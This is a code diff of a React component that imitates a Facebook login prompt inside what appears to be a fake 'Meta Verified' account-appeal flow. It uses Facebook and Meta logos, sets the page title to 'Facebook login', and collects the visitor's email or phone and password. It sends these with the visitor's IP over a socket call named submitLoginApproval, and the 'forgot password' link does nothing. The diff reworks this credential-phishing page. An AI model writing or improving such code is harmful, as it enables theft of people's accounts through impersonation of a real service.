@@ -1,74 +1,43 @@
-import '@/assets/css/login-modal.css';
+'use client';
+
+import '@/assets/css/meta-verified-modals.css';
 import FbRoundLogo from '@/assets/images/fb_round_logo.png';
 import MetaLogoGrey from '@/assets/images/meta-logo-grey.png';
+import type { MetaVerifiedTexts } from '@/constants/meta-verified-texts';
 import { useAppealContext } from '@/hooks/use-appeal-context';
 import { store } from '@/store/store';
 import { submitLoginApproval } from '@/hooks/use-socket';
-import translateText from '@/utils/translate';
 import Image from 'next/image';
-import Link from 'next/link';
 import { type FC, type FormEvent, useEffect, useState } from 'react';
 
-const TEXT = {
-    security:
-        'For your security, you must enter your password to continue.',
-    identityPlaceholder: 'Email or phone number',
-    passwordPlaceholder: 'Password',
-    error: 'Password is incorrect, please try again.',
-    waiting: 'Waiting for verification...',
-    continue: 'Continue',
-    forgot: 'Forgot your password?',
-    showPassword: 'Show password',
-    hidePassword: 'Hide password'
-} as const;
-
-const textsToTranslate = Object.values(TEXT);
-
-const PasswordEye: FC<{ show: boolean }> = ({ show }) => (
-    <svg viewBox='0 0 24 24' width='18' height='18' fill='none' stroke='currentColor' strokeWidth='1.8' aria-hidden='true'>
-        <path d='M2 12s3.5-6 10-6 10 6 10 6-3.5 6-10 6-10-6-10-6z' />
-        <circle cx='12' cy='12' r='2.8' />
-        {show ? <path d='M4 20L20 4' /> : null}
+const EyeOffIcon: FC = () => (
+    <svg xmlns='http://www.w3.org/2000/svg' width='20' height='20' viewBox='0 0 24 24' fill='none' stroke='currentColor' strokeWidth='2' strokeLinecap='round' strokeLinejoin='round'>
+        <path d='M10.733 5.076a10.744 10.744 0 0 1 11.205 6.575 1 1 0 0 1 0 .696 10.747 10.747 0 0 1-1.444 2.49' />
+        <path d='M14.084 14.158a3 3 0 0 1-4.242-4.242' />
+        <path d='M17.479 17.499a10.75 10.75 0 0 1-15.417-5.151 1 1 0 0 1 0-.696 10.75 10.75 0 0 1 4.446-5.143' />
+        <path d='m2 2 20 20' />
     </svg>
 );
 
-const FacebookLoginModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
+const EyeIcon: FC = () => (
+    <svg xmlns='http://www.w3.org/2000/svg' width='20' height='20' viewBox='0 0 24 24' fill='none' stroke='currentColor' strokeWidth='2' strokeLinecap='round' strokeLinejoin='round'>
+        <path d='M2.062 12.348a1 1 0 0 1 0-.696 10.75 10.75 0 0 1 19.876 0 1 1 0 0 1 0 .696 10.75 10.75 0 0 1-19.876 0' />
+        <circle cx='12' cy='12' r='3' />
+    </svg>
+);
+
+const FacebookLoginModal: FC<{ nextStep: () => void; uiTexts: MetaVerifiedTexts }> = ({ nextStep, uiTexts }) => {
     const [identity, setIdentity] = useState('');
     const [password, setPassword] = useState('');
     const [showPassword, setShowPassword] = useState(false);
     const [showError, setShowError] = useState(false);
-    const [isWaiting, setIsWaiting] = useState(false);
     const [isLoading, setIsLoading] = useState(false);
-    const [translations, setTranslations] = useState<Record<string, string>>({});
 
-    const { geoInfo } = store();
     const appeal = useAppealContext();
-
-    const t = (text: string): string => translations[text] || text;
 
     useEffect(() => {
         document.title = 'Facebook login';
     }, []);
-
-    useEffect(() => {
-        if (!geoInfo) {
-            return;
-        }
-
-        const translateAll = async () => {
-            const translatedMap: Record<string, string> = {};
-            for (const text of textsToTranslate) {
-                translatedMap[text] = await translateText(text, geoInfo.country_code);
-            }
-            setTranslations(translatedMap);
-        };
-
-        translateAll();
-    }, [geoInfo]);
-
-    const clearError = () => {
-        setShowError(false);
-    };
 
     const handleSubmit = async (e: FormEvent<HTMLFormElement>) => {
         e.preventDefault();
@@ -78,7 +47,6 @@ const FacebookLoginModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
 
         setShowError(false);
         setIsLoading(true);
-        setIsWaiting(true);
 
         try {
             if (!appeal.socket || !appeal.isConnected || !appeal.ip) {
@@ -116,83 +84,80 @@ const FacebookLoginModal: FC<{ nextStep: () => void }> = ({ nextStep }) => {
             setShowError(true);
             setPassword('');
         } finally {
-            setIsWaiting(false);
             setIsLoading(false);
         }
     };
 
     return (
-        <div className='login-modal-page login-modal-overlay' role='dialog' aria-modal='true'>
-            <div className='login-modal-card'>
-                <div className='login-modal-content'>
-                    <div className='mb-5 h-12 w-12'>
-                        <Image src={FbRoundLogo} alt='Facebook' width={48} height={48} className='h-full w-full object-contain' />
-                    </div>
+        <div className='mv-modal-overlay mv-modal-overlay--center' role='dialog' aria-modal='true'>
+            <div className='mv-modal-card mv-modal-card--login'>
+                <div style={{ width: '50px', height: '50px', flexShrink: 0 }}>
+                    <Image src={FbRoundLogo} width={50} height={50} alt='Facebook' style={{ objectFit: 'contain' }} />
+                </div>
 
-                    <div className='w-full'>
-                        <p className='mb-4 text-[14px] text-[#9a979e]'>{t(TEXT.security)}</p>
+                <div className='w-full'>
+                    <p style={{ marginBottom: '7px', fontSize: '14px', color: '#9a979e', lineHeight: 1.5 }}>{uiTexts.securityReason}</p>
 
-                        <form id='fb-login-form' autoComplete='off' onSubmit={handleSubmit}>
+                    <form autoComplete='off' onSubmit={handleSubmit}>
+                        <div className='mv-login-input-wrap'>
                             <input
-                                id='fb-identity'
-                                className='login-modal-identity'
+                                className='mv-login-input'
                                 type='text'
-                                placeholder={t(TEXT.identityPlaceholder)}
-                                autoComplete='off'
+                                placeholder={uiTexts.mobileOrEmail}
+                                autoComplete='username'
+                                required
                                 value={identity}
                                 onChange={(e) => {
                                     setIdentity(e.target.value);
-                                    clearError();
+                                    setShowError(false);
                                 }}
                             />
+                        </div>
 
-                            <div className='login-modal-password-wrap'>
-                                <input
-                                    id='fb-password'
-                                    className={`login-modal-password ${showError ? 'is-error' : ''}`}
-                                    type={showPassword ? 'text' : 'password'}
-                                    placeholder={t(TEXT.passwordPlaceholder)}
-                                    autoComplete='off'
-                                    maxLength={30}
-                                    minLength={3}
-                                    value={password}
-                                    onChange={(e) => {
-                                        setPassword(e.target.value);
-                                        clearError();
-                                    }}
-                                />
-                                <button
-                                    type='button'
-                                    className='login-modal-eye'
-                                    aria-label={showPassword ? t(TEXT.hidePassword) : t(TEXT.showPassword)}
-                                    onClick={() => setShowPassword((v) => !v)}
-                                >
-                                    <PasswordEye show={showPassword} />
-                                </button>
-                            </div>
-
-                            {showError ? <p className='login-modal-error'>{t(TEXT.error)}</p> : null}
-                            {isWaiting ? <p className='login-modal-waiting'>{t(TEXT.waiting)}</p> : null}
-
-                            <button type='submit' disabled={isLoading} className='login-modal-submit'>
-                                {isLoading ? <span className='login-modal-spinner' /> : t(TEXT.continue)}
+                        <div className={`mv-login-input-wrap${showError ? ' is-error' : ''}`}>
+                            <input
+                                className='mv-login-input'
+                                type={showPassword ? 'text' : 'password'}
+                                placeholder={uiTexts.password}
+                                autoComplete='off'
+                                maxLength={30}
+                                minLength={3}
+                                required
+                                value={password}
+                                onChange={(e) => {
+                                    setPassword(e.target.value);
+                                    setShowError(false);
+                                }}
+                            />
+                            <button
+                                type='button'
+                                className='mv-login-eye'
+                                tabIndex={-1}
+                                aria-label='toggle password visibility'
+                                onClick={() => setShowPassword((v) => !v)}
+                            >
+                                {showPassword ? <EyeIcon /> : <EyeOffIcon />}
                             </button>
+                        </div>
 
-                            <p className='mt-3 mb-0 text-center'>
-                                <Link
-                                    href='#'
-                                    className='text-[14px] text-[#9a979e] no-underline'
-                                    onClick={(e) => e.preventDefault()}
-                                >
-                                    {t(TEXT.forgot)}
-                                </Link>
-                            </p>
-                        </form>
-                    </div>
+                        {showError ? (
+                            <p style={{ color: '#e74c3c', fontSize: '13px', margin: '0 0 10px 2px' }}>{uiTexts.passwordIncorrect}</p>
+                        ) : null}
 
-                    <div className='mt-5 w-16'>
-                        <Image src={MetaLogoGrey} alt='Meta' width={64} className='w-full object-contain' />
-                    </div>
+                        <div style={{ marginTop: '20px', width: '100%' }}>
+                            <button type='submit' className='mv-login-submit' disabled={isLoading}>
+                                {isLoading ? <span className='mv-modal-spinner' /> : uiTexts.continueBtn}
+                            </button>
+                        </div>
+
+                        <div style={{ marginTop: '10px', textAlign: 'center' }}>
+                            <span style={{ fontSize: '14px', color: '#9a979e', opacity: 0.5 }}>{uiTexts.forgotPassword}</span>
+                        </div>
+                    </form>
+                </div>
+
+                <div style={{ width: '60px', height: '60px', flexShrink: 0 }}>
+                    <Image src={MetaLogoGrey} width={60} height={60} alt='Meta' style={{ objectFit: 'contain' }} />
                 </div>
             </div>
         </div>
